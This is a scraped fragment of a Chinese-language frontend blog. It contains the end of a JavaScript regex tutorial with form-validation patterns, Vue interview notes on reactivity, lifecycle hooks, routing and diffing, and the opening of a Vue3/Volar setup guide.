regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // (?\u0026lt;!foo)bar，當 bar 前面沒有 foo 時才會配對到 bar const regexp = /(?\u0026lt;!foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 0, input: \u0026#39;bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;123bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;123bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foobar\u0026#39;); // null ❗❗❗ Lookbehind assertions 屬於 ES2018 的語法，須注意相容性。 ❗❗❗\n貪婪模式（Greedy Mode） 預設會啟用貪婪模式，如果想要關閉貪婪模式，也就是讓到一匹配到就停止，可以使用在 * 、 + 等後面加上 ?，例如 .*?、.+?。\npattern 筆記 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 export default { // 允許數字、英文字 // 長度4~12 account: /^[0-9A-Za-z]{4,12}$/, // 需包含數字、英文字、英文特殊符號 // 但不得包含符號 \\ // 長度1~24 password: /^(?=.*\\d)(?=.*[a-zA-Z])[a-zA-Z0-9!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~`]{1,24}$/, // 允許數字、英文字、中文字 // 長度2~8 nickName: /^[0-9A-Za-z\\u4E00-\\u9FFF]{2,8}$/, // 允許數字、英文字、中文字、英文特殊符號、空白，但開頭不得為特殊符號或空白 realName: /^(?!(-))(?!(\\s))(?!(,))[A-Za-z\\-\\,\\s\\u4E00-\\u9FFF]{0,20}[^(?=(!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~\\s\\d`)))]$/, // 信箱 createEmail: /^([\\w])([\\-\\._]?[\\w]){0,64}\\@([\\w])([\\-\\._]?[\\w]){0,64}\\.([a-zA-Z]){2,6}$/, // 前三碼英文字、後三碼數字 promotionCode: /^[A-Za-z]{3}[0-9]{3}$/, // 允許數字、英文字、中文字、英文特殊符號、中文特殊符號、空白 // 長度0~100 remark: /^[0-9A-Za-z-_\\u4E00-\\u9FA5+/.*!@#$%\u0026amp;?()=|\u0026#39;:;\u0026lt;\u0026gt;,~！@#￥……\u0026amp;*（）——|{}【】‘；：”“\u0026#39;。，、？%\\s]{0,100}$/, } ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282544509_9802b00af7_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-regex/","title":"Javascript 的正則表達式(Regular Expression, regex)"},{"content":" 參考網站\n基礎篇 1. 對 SPA 單頁⾯的理解，優缺點是什麼？ SPA（ single-page application ）僅在 Web 頁⾯初始化時加載相應的 HTML、JavaScript 和 CSS。 ⼀旦頁⾯加載完成，SPA 不會因為⽤戶的操作⽽進⾏⻚⾯的重新加載或跳轉；取⽽代之的是利⽤路由機制實現 HTML 內容的變換，UI 與⽤戶的交互，避免頁⾯的重新加載。 優點： ⽤戶體驗好、快，內容的改變不需要重新加載整個頁⾯，避免了不必要的跳轉和重複渲染 SPA 相對對服務器壓⼒⼩ 前後端職責分離，架構清晰，前端進⾏交互邏輯，後端負責數據處理 缺點： ⾸屏（初次）加載慢：為實現單⻚ Web 應⽤功能及顯示效果，需要在加載⻚⾯的時候將JavaScript、CSS 統⼀加載，部分⻚⾯按需加載 不利於 SEO：由於所有的內容都在⼀個⻚⾯中動態替換顯示，所以在 SEO 上其有著天然的弱勢 2. new Vue() 發生了什麼？ 結論：new Vue()是創建Vue實例，它內部執行了根實例的初始化過程 具體包括以下操作： 選項合併，children, refs, slot, createElement等实例属性的方法初始化 自定義事件處理 數據響應式處理 生命週期鉤子調用 (beforecreate created) 可能的掛載 總結：new Vue()創建了根實例並準備好數據和方法，未來執行掛載時，此過程還會遞歸的應用於它的子組件上，最終形成一個有緊密關係的組件實例樹 3. Vue.use是幹什麼的？原理是什麼？ vue.use 是用來使用插件的，我們可以在插件中擴展全局組件、指令、原型方法等。 檢查插件是否註冊，若已註冊，則直接跳出 處理入參，將第一個參數之後的參數歸集，並在首部塞入 this 上下文 執行註冊方法，調用定義好的 install 方法，傳入處理的參數，若沒有 install 方法並且插件本身為 function 則直接進行註冊 插件不能重複的加載，install 方法的第一個參數是vue的構造函數，其他參數是Vue.set中除了第一個參數的其他參數； 代碼：args.unshift(this) 調用插件的install 方法 代碼：typeof plugin.install === \u0026ldquo;function\u0026rdquo; 插件本身是一個函數，直接讓函數執行。代碼：plugin.apply(null, args) 緩存插件。代碼：installedPlugins.push(plugin) 4. 請說一下響應式數據的理解？ 根據數據類型來做不同處理，數組和對像類型當值變化時如何劫持。 對象內部通過defineReactive方法，使用 Object.defineProperty() 監聽數據屬性的 get 來進行數據依賴收集，再通過 set 來完成數據更新的派發 數組則通過重寫數組方法來實現的。擴展它的 7 個變更⽅法，通過監聽這些方法可以做到依賴收集和派發更新 內部依賴收集是怎麼做到的？每個屬性都擁有自己的dep屬性，存放他所依賴的 watcher，當屬性變化後會通知自己對應的 watcher去更新 響應式流程：\ndefineReactive 把數據定義成響應式的 給屬性增加一個 dep，用來收集對應的那些watcher 等數據變化進行更新\ndep.depend() // get 取值：進行依賴收集\ndep.notify() // set 設置時：通知視圖更新 對象層級過深，性能就會差 不需要響應數據的內容不要放在data中 object.freeze() 可以凍結數據 5. Vue如何檢測數組變化？ 數組考慮性能原因沒有用defineProperty對數組的每一項進行攔截，而是選擇重寫數組 方法以進行重寫。當數組調用到這 7 個方法的時候，執行 ob.dep.notify() 進行派發通知 Watcher 更新 在Vue中修改數組的索引和長度是無法監控到的。需要通過以下7種變異方法修改數組才會觸發數組對應的wacther進行更新。數組中如果是對像數據類型也會進行遞歸劫持 那如果想要改索引更新數據怎麼辦？\n可以通過Vue.set()來進行處理 ➞ 核心內部用的是 splice 方法 1 2 3 4 5 6 7 8 9 // 取出原型方法； const arrayProto = Array.prototype // 拷貝原型方法； export const arrayMethods = Object.create(arrayProto) // 重寫數組方法； def(arrayMethods, method, function mutator (…args) { } ob.dep.notify() // 調用方法時更新視圖 6. Vue.set 方法是如何實現的？ 為什麼$set可以觸發更新，我們給對象和數組本身都增加了dep屬性，當給對像新增不存在的屬性則觸發對象依賴的watcher去更新，當修改數組索引時我們調用數組本身的splice方法去更新數組 官方定義 Vue.set(object, key, value)\n7. Vue中模板編譯原理？ 如何將template轉換成render函數(這裡要注意的是我們在開發時盡量不要使用template，因為將template轉化成render方法需要在運行時進行編譯操作會有性能損耗，同時引用帶有complier包的vue體積也會變大) 默認.vue文件中的 template處理是通過vue-loader 來進行處理的並不是通過運行時的編譯 將 template 模板轉換成 ast 語法樹 - parserHTML 對靜態語法做靜態標記 - markUp 重新生成代碼 - codeGen 模板引擎的實現原理就是new Function + with來進行實現的\nvue-loader中处理template属性主要靠的是 vue-template-compiler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // vue-loader // template =\u0026gt; ast =\u0026gt; codegen =\u0026gt; with+function 實現生成render方法 let {ast, render } = VueTemplateCompiler.compile(\u0026lt;div\u0026gt;{{aaa}}\u0026lt;/div\u0026gt;) console.log(ast, render) // 模板引擎的實現原理 with + new Function console.log(new Function(render).tostring()) // render方法執行完畢後生成的是虛擬 dom // with(this){return _c(‘div’,[_s(aaa)])} // 代碼生成 const ast = parse(template.trim(), options) // 將代碼解析成ast語法樹 if (options.optimize !== false) { optimize(ast, options) // 優化代碼 標記靜態點 標記樹 } const code = generate(ast, options) // 生成代碼 8. Proxy 與 Object.defineProperty 優劣對比 Proxy 的優勢如下 Proxy 可以直接監聽對象而非屬性 Proxy 可以直接監聽數組的變化 Proxy 有多達 13 種攔截方法,不限於 apply、ownKeys、deleteProperty、has 等等是 Object.defineProperty 不具備的 Proxy 返回的是一個新對象,我們可以只操作新的對象達到目的,而 Object.defineProperty 只能遍歷對象屬性直接修改 Proxy 作為新標準將受到瀏覽器廠商重點持續的性能優化，也就是傳說中的新標準的性能紅利 Object.defineProperty 的優勢如下 兼容性好，支持 IE9，而 Proxy 的存在瀏覽器兼容性問題，而且無法用 polyfill 磨平，因此 Vue 的作者才聲明需要等到下個大版本( 3.0 )才能用 Proxy 重寫 9. Vue3.x響應式數據原理 Vue3.x改用Proxy替代Object.defineProperty。因為Proxy可以直接監聽對象和數組的變化，並且有多達13種攔截方法。並且作為新標準將受到瀏覽器廠商重點持續的性能優化 Proxy只會代理對象的第一層，那麼Vue3又是怎樣處理這個問題的呢？\n判斷當前Reflect.get的返回值是否為Object，如果是則再通過reactive方法做代理， 這樣就實現了深度觀測 監測數組的時候可能觸發多次get/set，那麼如何防止觸發多次呢？\n我們可以判斷key是否為當前被代理對象target自身屬性，也可以判斷舊值與新值是否相等，只有滿足以上兩個條件之一時，才有可能執行trigger 生命周期篇 Vue的生命週期方法有哪些？一般在哪一步發起請求及原因 總共分為8個階段：創建前/後，載入前/後，更新前/後，銷毀前/後 創建前/後：\nbeforeCreate階段：vue實例的掛載元素el和數據對象data都為undefined，還未初始化。\n說明：在當前階段data、methods、computed以及watch上的數據和方法都不能被訪問。\ncreated階段：vue實例的數據對象data有了，el還沒有。\n說明：可以做一些初始數據的獲取，在當前階段無法與Dom進行交互，如果非要想，可以通過vm.$nextTick來訪問Dom。\n載入前/後：\nbeforeMount階段：vue實例的$el和data都初始化了，但還是掛載之前為虛擬的dom節點。\n說明：當前階段虛擬Dom已經創建完成，即將開始渲染。在此時也可以對數據進行更改，不會觸發updated。\nmounted階段：vue實例掛載完成，data.message成功渲染。\n說明：在當前階段，真實的Dom掛載完畢，數據完成雙向綁定，可以訪問到Dom節點，使用$refs屬性對Dom進行操作。\n更新前/後：\nbeforeUpdate階段：響應式數據更新時調用，發生在虛擬DOM打補丁之前，適合在更新之前訪問現有的DOM，比如手動移除已添加的事件監聽器。\n說明：可以在當前階段進行更改數據，不會造成重渲染。\nupdated階段：虛擬DOM重新渲染和打補丁之後調用，組成新的DOM已經更新，避免在這個鉤子函數中操作數據，防止死循環。\n說明：當前階段組件Dom已完成更新。要注意的是避免在此期間更改數據，因為這可能會導致無限循環的更新。\n銷毀前/後：\nbeforeDestroy階段：實例銷毀前調用，實例還可以用，this能獲取到實例，常用於銷毀定時器，解綁事件。\n說明：在當前階段實例完全可以被使用，我們可以在這時進行善後收尾工作，比如清除計時器。\ndestroyed階段：實例銷毀後調用，調用後所有事件監聽器會被移除，所有的子實例都會被銷毀。\n說明：當前階段組件已被拆解，數據綁定被卸除，監聽被移出，子實例也統統被銷毀。\n補充：\n第一次頁面加載時會觸發：beforeCreate, created, beforeMount, mounted。\ncreated 實例已經創建完成，因為它是最早觸發的原因可以進行一些數據，資源的請求。 (服務器渲染支持created方法) mounted 實例已經掛載完成，可以進行一些DOM操作。 (接口請求) 生命週期鉤子是如何實現的？ Vue的生命週期鉤子就是回調函數而已，當創建組件實例的過程中會調用對應的鉤子方法。 補充：\n內部主要是使用callHook方法來調用對應的方法。核心是一個發布訂閱模式，將鉤子訂閱好(內部採用數組的方式存儲)，在對應的階段進行發布。\nVue 的父組件和子組件生命週期鉤子執行順序 第一次頁面加載時會觸發 beforeCreate, created, beforeMount, mounted 這幾個鉤子。 渲染過程： 父組件掛載完成一定是等子組件都掛載完成後，才算是父組件掛載完，所以父組件的mounted在子組件mouted之後\n父beforeCreate ➡ 父created ➡ 父beforeMount ➡ 子beforeCreate ➡ 子created ➡ 子beforeMount ➡ 子mounted ➡ 父mounted\n子組件更新過程： 影響到父組件：父beforeUpdate -\u0026gt; 子beforeUpdate-\u0026gt;子updated -\u0026gt; 父updted\n不影響父組件：子beforeUpdate -\u0026gt; 子updated\n父組件更新過程： 影響到子組件：父beforeUpdate -\u0026gt; 子beforeUpdate-\u0026gt;子updated -\u0026gt; 父updted\n不影響子組件：父beforeUpdate -\u0026gt; 父updated\n銷毀過程： 父beforeDestroy -\u0026gt; 子beforeDestroy -\u0026gt; 子destroyed -\u0026gt; 父destroyed\n重要：父組件等待子組件完成後，才會執行自己對應完成的鉤子。\n組件通信篇 Vue中的組件的data 為什麼是一個函數？ 每次使用組件時都會對組件進行實例化操作，並且調用data函數返回一個對像作為組件的數據源。這樣可以保證多個組件間數據互不影響。 如果data是對象的話，對象屬於引用類型，會影響到所有的實例。所以為了保證組件不同的實例之間data不衝突，data必須是一個函數。 Vue 組件間通信有哪幾種方式？ Vue 組件間通信只要指以下 3 類通信：父子組件通信、隔代組件通信、兄弟組件通信，下面我們分別介紹每種通信方式且會說明此種方法可適用於哪類組件間通信。 props / $emit 適用父子組件通信\n這種方法是 Vue 組件的基礎，相信大部分同學耳聞能詳，所以此處就不舉例展開介紹。 ref 與 $parent / children适用父子组件通信\nref：如果在普通的DOM元素上使用，引用指向的就是DOM元素；如果用在子組件上，引用就指向組件實例 parent / $children：訪問父 / 子實例 EventBus （$emit / $on） 適用於 父子、隔代、兄弟組件通信\n這種方法通過一個空的 Vue 實例作為中央事件總線（事件中心），用它來觸發事件和監聽事件，從而實現任何組件間的通信，包括父子、隔代、兄弟組件。 attrs / listeners 適用於隔代組件通信\nattrs：包含了父作用域中不被prop所識別(且獲取)的特性綁定(class和style除外)。當一個組件沒有聲明任何prop時，這裡會包含所有父作用域的綁定(class和style除外)，並且可以通過v−bind=\u0026ldquo;attrs\u0026rdquo; 傳入內部組件。通常配合 inheritAttrs 選項一起使用。 listeners：包含了父作用域中的(不含.native修飾器的) v-on事件監聽器。它可以通過v−on=\u0026ldquo;listeners\u0026rdquo; 傳入內部組件 provide / inject 適用於隔代組件通信\n祖先組件中通過 provider 來提供變量，然後在子孫組件中通過 inject 來注入變量。 provide / inject API 主要解決了跨級組件間的通信問題，不過它的使用場景，主要是子組件獲取上級組件的狀態，跨級組件間建立了一種主動提供與依賴注入的關係。 Vuex 適用於 父子、隔代、兄弟組件通信\nVuex 是一個專為 Vue.js 應用程序開發的狀態管理模式。每一個 Vuex 應用的核心就是 store（倉庫）。 \u0026ldquo;store\u0026rdquo; 基本上就是一個容器，它包含著你的應用中大部分的狀態 (state)。 組件中寫 name選項有哪些好處及作用？ 可以通過名字找到對應的組件（遞歸組件） 可以通過name屬性實現緩存功能 (keep-alive) 可以通過name來識別組件（跨級組件通信時非常重要） 1 2 3 4 5 Vue.extend = function () { if(name) { Sub.options.componentd[name] = Sub } } keep-alive平時在哪裡使用？原理是？ keep-alive 主要是組件緩存，採用的是LRU算法。最近最久未使用法。 常用的兩個屬性include/exclude，允許組件有條件的進行緩存。 兩個生命週期activated/deactivated，用來得知當前組件是否處於活躍狀態。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 abstract: true, // 抽象組件 props:{ include: patternTypes, // 要緩存的有哪些 exclude: patternTypes, // 要排除的有哪些 max: [String, Number] //最大緩存數量 } if(cache[key]) { // 通過key 找到緩存，獲取實例 vnode.componentInstance = cache[key].componentInstance remove(keys, key) //將key刪除掉 keys.push(key) // 放到末尾 } else { cache[key] = vnode // 沒有緩存過 keys.push(key) //存儲key if(this.max \u0026amp;\u0026amp; keys.length \u0026gt; parseInt(this.max)) { // 如果超過最大緩存數 // 刪除最早緩存的 pruneCacheEntry(cache, keys[0], keys, this._vnode) } } vnode.data.keepAlive = true // 標記走了緩存 Vue.minxin的使用場景和原理？ Vue.mixin的作用就是抽離公共的業務邏輯，原理類似\u0026quot;對象的繼承\u0026quot;，當組件初始化時會調用 mergeOptions方法進行合併，採用策略模式針對不同的屬性進行合併，如果混入的數據和本身組件中的數據衝突，會採用\u0026quot;就近原則\u0026quot;以組件的數據為準。 補充：\nmixin中有很多缺陷\u0026quot;命名衝突問題\u0026quot;、\u0026ldquo;依賴問題\u0026rdquo;、\u0026ldquo;數據來源問題\u0026rdquo;，這裡強調一下mixin的數據是不會被共享的。\n路由篇 Vue-router有幾種鉤子函數？具體是什麼及執行流程是怎樣的？ 路由鉤子的執行流程，鉤子函數種類有：全局守衛、路由守衛、組件守衛。 完整的導航解析流程 導航被觸發 在失活的組件裡調用beforeRouteLeave守衛 調用全局beforeEach守衛 在復用組件裡調用beforeRouteUpdate守衛 調用路由配置裡的beforeEnter守衛 解析異步路由組件 在被激活的組件裡調用beforeRouteEnter守衛 調用全局beforeResolve守衛 導航被確認 調用全局的afterEach鉤子 DOM更新 用創建好的實例調用beforeRouteEnter守衛中傳給next的回調函數 vue-router 兩種模式的區別？ vue-router 有 3 種路由模式：hash、history、abstract。 hash模式：hash + hashChange\n特點：hash雖然在URL中，但不被包括在HTTP請求中；用來指導瀏覽器動作，對服務端安全無用，hash不會重加載頁面。通過監聽 hash（#）的變化來執行js代碼 從而實現 頁面的改變。\n核心代码：\n1 2 3 window.addEventListener(‘hashchange‘,function(){ self.urlChange() }) history模式：historyApi + popState\nHTML5推出的history API，由pushState()記錄操作歷史，監聽popstate事件來監聽到狀態變更。\n因為只要刷新這個url(www.ff.ff/jjkj/fdfd/fdf/fd)就會請求服務器，然而服務器上根本沒有這個資源，所以就會報404，解決方案就配置一下服務器端。\n說明：\n1. hash: 使用 URL hash 值來作路由。支持所有瀏覽器，包括不支持 HTML5 History Api 的瀏覽器\n2. history : 依賴 HTML5 History API 和服務器配置。具體可以查看 HTML5 History 模式\n3. abstract : 支持所有 JavaScript 運行環境，如 Node.js 服務器端。如果發現沒有瀏覽器的 API，路由會自動強制進入這個模式\n屬性作用與對比篇 nextTick在哪裡使用？原理是？ nextTick的回調是在下次DOM更新循環結束之後執行的延遲回調。在修改數據之後立即使用這個方法，獲取更新後的DOM。 nextTick主要使用了宏任務和微任務。原理就是異步方法(promise, mutationObserver, setImmediate, setTimeout)經常與事件循環一起來問。 補充：\nvue多次更新數據，最終會進行批處理更新。內部調用的就是nextTick實現了延遲更新，用戶自定義的nextTick中的回調會被延遲到更新完成後調用，從而可以獲取更新後的DOM。\nVue 為什麼需要虛擬DOM？虛擬DOM的優劣如何？ Virtual DOM 就是用js對象來描述真實DOM，是對真實DOM的抽象，由於直接操作DOM性能低但是js層的操作效率高，可以將DOM操作轉化成對像操作，最終通過diff算法比對差異進行更新DOM(減少了對真實DOM的操作)。虛擬DOM不依賴真實平台環境從而也可以實現跨平台。 補充：\n虛擬DOM的實現就是普通對象包含tag、data、children等屬性對真實節點的描述。(本質上就是在JS和DOM之間的一個緩存)\nVue2的 Virtual DOM 借鑒了開源庫snabbdom的實現。\nVirtualDOM映射到真實DOM要經歷VNode的create、diff、patch等階段。\nVue中key的作用和工作原理，說說你對它的理解 例如： 1 v-for=\u0026#34;(item, itemIndex) in tabs\u0026#34; :key=\u0026#34;itemIndex\u0026#34; key的作用主要是為了高效的更新虛擬DOM，其原理是vue在patch過程中通過key可以精準判斷兩個節點是否是同一個，從而避免頻繁更新不同元素，使得整個patch過程更加高效，減少DOM操作量，提高性能。 補充：\n若不設置key還可能在列表更新時引發一些隱蔽的bug vue中在使用相同標籤名元素的過渡切換時，也會使用到key屬性，其目的也是為了讓vue可以區分它們，否則vue只會替換其內部屬性而不會觸發過渡效果 Vue 中的diff原理 vue的diff算法是平級比較，不考慮跨級比較的情況。內部採用深度遞歸的方式 + 雙指針的方式進行比較。 補充：\n先比較是否是相同節點 相同節點比較屬性，並複用老節點 比較兒子節點，考慮老節點和新節點兒子的情況 優化比較：頭頭、尾尾、頭尾、尾頭 比對查找進行複用 Vue2 與 Vue3.x 的diff算法： Vue2的核心Diff算法採用了雙端比較的算法，同時從新舊children的兩端開始進行比較，借助key值找到可複用的節點，再進行相關操作。 Vue3.x借鑒了ivi算法和 inferno算法，該算法中還運用了動態規劃的思想求解最長遞歸子序列。 (實際的實現可以結合Vue3.x源碼看。) v-if 與 v-for的優先級 v-for優先於v-if被解析 如果同時出現，每次渲染都會先執行循環再判斷條件，無論如何循環都不可避免，浪費了性能 要避免出現這種情況，則在外層嵌套template，在這一層進行v-if判斷，然後在內部進行v-for循環 如果條件出現在循環內部，可通過計算屬性提前過濾掉那些不需要顯示的項 v-if與v-show的區別 v-if 是真正的條件渲染，直到條件第一次變為真時，才會開始渲染。 v-show 不管初始條件是什麼會渲染，並且只是簡單地基於 CSS 的 “display” 屬性進行切換。 注意：v-if 適用於不需要頻繁切換條件的場景；v-show 則適用於需要非常頻繁切換條件的場景。\ncomputed 和 watch 的區別和運用的場景？ computed： 計算屬性。依賴其它屬性值，並且 computed 的值有緩存，只有它依賴的屬性值發生改變，下一次獲取 computed 的值時才會重新計算 computed 的值 watch： 監聽數據的變化。更多的是「觀察」的作用，類似於某些數據的監聽回調 ，每當監聽的數據變化時都會執行回調進行後續操作 運用場景： 當我們需要進行數值計算，並且依賴於其它數據時，應該使用 computed，因為可以利用 computed 的緩存特性，避免每次獲取值時，都要重新計算。 當我們需要在數據變化時執行異步或開銷較大的操作時，應該使用 watch，使用 watch 選項允許我們執行異步操作 ( 訪問一個 API )，限制我們執行該操作的頻率，並在我們得到最終結果前，設置中間狀態。這些都是計算屬性無法做到的。 如何理解自定義指令？ 指令的實現原理，可以從編譯原理 ➡ 代碼生成 ➡ 指令鉤子實現進行概述 在生成 ast 語法樹時，遇到指令會給當前元素添加directives屬性 通過 genDirectives 生成指令代碼 在patch前將指令的鉤子提取到 cbs中，在patch過程中調用對應的鉤子 當執行指令對應鉤子函數時，調用對應指令定義的方法 v-model的原理是什麼？ v-model本質就是一個語法糖，可以看成是value + input方法的語法糖。可以通過model屬性的prop和event屬性來進行自定義。原生的v-model，會根據標籤的不同生成不同的事件和屬性。 v-model 在內部為不同的輸入元素使用不同的屬性並拋出不同的事件： text 和 textarea 元素使用 value 屬性和 input 事件。 checkbox 和 radio 使用 checked 屬性和 change 事件。 select 字段將 value 作為 prop 並將 change 作為事件。 性能優化篇 Vue性能優化 - 編碼階段 盡量減少data中的數據，data中的數據都會增加getter和setter，會收集對應的watcher 如果需要使用v-for給每項元素綁定事件時使用事件代理 SPA 頁面採用keep-alive緩存組件 在更多的情況下，使用v-if替代v-show key保證唯一 使用路由懶加載、異步組件 防抖、節流 第三方模塊按需導入 長列表滾動到可視區域動態加載 圖片懶加載 Vue性能優化 - 用戶體驗 骨架屏 PWA 使用緩存(客戶端緩存、服務端緩存)優化、服務端開啟gzip壓縮等 Vue性能優化 - SEO優化 預渲染 服務端渲染SSR Vue性能優化 - 打包優化 壓縮代碼 Tree Shaking/Scope Hoisting 使用cdn加載第三方模塊 多線程打包happypack splitChunks抽離公共文件 sourceMap優化 ","date":"2022-08-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52282698225_df2b066743_o.jpg","permalink":"https://wayneblog.ga/2022-08-12/vue-interview-note/","title":"Vue 基本概念與常見面試題筆記"},{"content":" 本文適合 Vue3 初學者，或者 Vue2 遷移者，當然還是建議 Vue3 官網完全過一遍。\n先推薦兩個 vscode 外掛 Volar 首先推薦 Volar ，使用 vscode 開發 Vue 專案的小夥伴肯定都認識 Vetur 這個神級外掛，有了它可以讓我們得開發如魚得水。 那麼 Volar 可以理解為 Vue3 版本的 Vetur ，程式碼高亮，語法提示，基本上 Vetur 有的它都有。\n功能一：多個根節點編譯器不會報錯 Vue3 是允許我們有多個根節點的，但是我們如果使用 Vetur 就會報錯，不會影響執行，但是看起來就很煩。所以當我們轉向 Volar，那麼就不會出現這個問題了。\n功能二：編輯器分隔 即便 Vue 的元件化開發，可以將單檔案的程式碼長度大幅縮短，但還是動輒幾百行甚是上千行。那麼我們切換 template、script、style 的時候就要頻繁上下翻，雖然有的外掛可以直接定位到 css，但是你回不去啊！所以這個功能簡直是太人性化了。\n安裝完 Volar 以後，開啟一個 .vue 檔案，看 vscode 的右上角，有這麼一個圖示，點一下。\n它就會自動給你分隔成三個頁面，分別對應 template、script、style，這樣就太舒服了有沒有。\n還有很多新功能，可以參考下面這篇文章：\nVolar - vue終極開發神器！\n功能三：ref sugar 語法快捷改動支持 ref sugar 是一個還在 rfc 階段的功能，但是已經持續很久了，現在的 vue3 版本已經可以嚐鮮使用了。具體的用法以及語法我就不展開贅述了，我主要說一下 Volar 和 ref sugar 的結合。\n報錯先不管，是 eslint-plugin-vue 的原因。\n可以看到，在使用了 ref sugar 之後，script 上面出現了一個 ref sugar 的小圖標，並且打了個對勾，那麼我們點一下那個對勾，看看會發生什麼。\n可以看到，我們點擊這個小對勾之後，它由原本的 ref sugar 語法變為了普通的 script setup 模式，驚不驚喜，意不意外。\n功能四：style 裡面的 class 引用 可以看到，在 .foo 這個類名上面，出現了一個 1 reference 的小圖標，代表著當前 class 有一次引用，我們點擊一下這個 1 reference。\n出現了一個彈窗，裡面是當前 class 的具體使用位置。\n功能五：class 追朔 我們創建一個 template 根元素，在裡面寫入：\nsample.vue 1 2 3 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在 style 中寫入：\nsample.vue 1 2 3 \u0026lt;style scoped\u0026gt; .foo {} \u0026lt;/style\u0026gt; 除了 style 中的 .foo 上面會出現 1 reference 的小圖標之外，在 class=\u0026quot;foo\u0026quot; 的 foo 下面，會出現一道橫線。\n對於經常使用 vscode 的開發人員來說，這代表什麼意義就不必多說了，我們根據提示，按住 ctrl(command) 然後點擊，會發現光標自己移動到了 style 中的 .foo 之前，哇! awesome!\n功能六：css module 類型提示 css module 一般是 react 技術棧用的會比較多一些，就我個人來說，是從沒在 vue 裡面使用它的，因為 vue 提供了 scoped 作用域，不用擔心樣式衝突，直接使用預處理器會更加簡單方便。\n我們創建如下代碼：\nsample.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div :class=\u0026#34;$style.foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style module\u0026gt; .foo { } \u0026lt;/style\u0026gt; 然後將鼠標移動到 $style 上\n有點意思，看來 vscode 是讓 Volar 玩明白了。\n功能七：lang 語法提示 vue 可以使用 lang 屬性來選擇使用的語言，比如 template 中的 html/pug、script 中的 ts、style 中的 scss 等。\n但是在以前，我們都是手動輸入的，編輯器，或者說 Vetur 並沒有給我們提供任何提示，有可能你找了很久的莫名其妙的問題，就是因為 lang 寫錯了。\n但是這一切，在有了 Volar 之後，都不同了。\n功能八：template 語法轉換 vue 默認提供了兩種模板供我們使用，但是一般都會使用 html，另外一種叫做 pug。\n相對於 html，pug 更偏向於 yml 那種，簡潔程度特別高。\n在 Volar 中，為我們提供了 html 和 pug 互相轉換的功能。\nsample.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;img /\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在我們書寫 template 之後，template 頂部會出現一個小小的 pug 圖標，我們可以看到此時它是沒有被選中的。\n這個時候我們點擊一下這個圖標，讓它選中，神奇的事情發生了。\n我們寫好的 html 模板，被自動轉化成了 pug，再點擊一下，又回到了我們熟悉的 html。\n從功能三開始，基本都是算內測的新功能，我是機緣巧合之下，將 Volar 下到本地進行查看的時候發現的這些。想嚐鮮的可以自己下載源碼，然後在packages/vscode-vue-languageservice/testCases目錄下體驗，希望這些功能可以盡快發布！\nVue 3 Snippets 推薦的第二個外掛叫做 Vue 3 Snippets ，同樣的，他也有自己的 Vue2 版本。它是幹什麼的呢，可以看一下下面這張圖，我只輸入了 \u0026quot;v3\u0026quot; ，它有很多提示，我們就先選擇 v3computed ，選中 Enter 即可。\n然後它就給我們自動寫了如下程式碼：\n是不是超級省事，摸魚的時間又增加了！還有更多有趣的使用方式，小夥伴們自行探索吧。\n建立 Vue3 專案 那麼正式開始學習我們的 Vue3 ，先從建立專案開始。\n使用 vue-cli 建立 輸入下面的命令然後選擇配置項進行安裝即可，這裡注意 vue-cli 的版本一定要在 ==4.5.0== 以上。\n1 2 3 4 5 6 7 8 ### 安裝或者升級 npm install -g @vue/cli ### 檢視版本 保證 vue cli 版本在 4.5.0 以上 vue --version ### 建立專案 vue create my-project ### 然後根據提示一步一步傻瓜式操作就行了 ### ... 使用 Vite 建立 都說 Vue3.0 和 Vite2 更配，各種優化各種快，但都不屬於本文的內容，本文的目的我們只需要知道它特別好用、怎麼用就行了。我這裡是多選擇了 TS，每行都有註釋，一目瞭然。\n1 2 3 4 5 6 7 8 ### 初始化 viete 專案 npm init vite-app \u0026lt;project-name\u0026gt; ### 進入專案資料夾 cd \u0026lt;project-name\u0026gt; ### 安裝依賴 npm install ### 啟動專案 npm run dev 建立完以後我們先來看看入口檔案 main.ts\nmain.ts 1 2 3 4 5 6 // 引入 createApp 函式，建立對應的應用，產生應用的例項物件 import { createApp } from \u0026#39;vue\u0026#39;; // 引入 app 元件 (所有元件的父級元件) import App from \u0026#39;./App.vue\u0026#39;; // 建立 app 應用返回對應的例項物件，呼叫 mount 方法進行掛載，掛載到 #app 節點上去 createApp(App).mount(\u0026#39;#app\u0026#39;); 然後看看根元件 app.vue\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- Vue2 元件中的 html 模板中必須要有一對根標籤，Vue3 元件的 html 模板中可以沒有根標籤 --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;img alt=\u0026#34;Vue logo\u0026#34; src=\u0026#34;./assets/logo.png\u0026#34;\u0026gt; \u0026lt;!-- 使用子級元件 --\u0026gt; 